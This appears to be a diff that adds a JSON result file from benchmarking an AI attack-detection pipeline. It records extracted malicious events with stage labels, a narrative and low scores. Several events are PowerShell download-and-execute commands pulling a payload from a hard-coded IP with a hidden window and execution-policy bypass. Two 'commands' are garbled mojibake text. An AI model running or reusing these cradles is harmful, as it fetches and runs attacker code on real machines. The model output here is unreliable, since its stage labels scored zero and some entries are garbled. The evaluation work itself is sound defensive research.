@@ -1,0 +1,76 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u05366\ufffd\u057f\u0587\uc97cu\u055d\ub065\ucdddu\uc788\ub294\ub370\ud558\uace0\ub098\uac00\uae30\uc5c8\ub85c\ub825\uc744 \uc548\ub155\uac00 \ud588\ub9ac\uae30.",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u05366\ufffd\u057f\u0587\uc97cu\u055d\ub065\ucdddu\uc788\ub294\ub370\ud558\uace0\ub098\uac00\uae30\uc5c8\ub85c\ub825\uc744 \uc548\ub155\uac00 \ud588\ub9ac\uae30.",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "An adversary gained access to the system through the use of PowerShell scripts, utilizing bypassing techniques against Windows defender policies. They established command and control channels via HTTP GET requests to download further payloads.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 76350,
+      "completion_tokens": 4810,
+      "total_tokens": 81160,
+      "wall_clock_s": 168.382,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6666666666666666,
+      "recall": 0.15384615384615385,
+      "f1": 0.25,
+      "tp": 4,
+      "fp": 2,
+      "fn": 22
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 23,
+      "recall_partial": 0.021739130434782608
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 76350,
+      "completion_tokens": 4810,
+      "total_tokens": 81160,
+      "wall_clock_s": 168.382,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
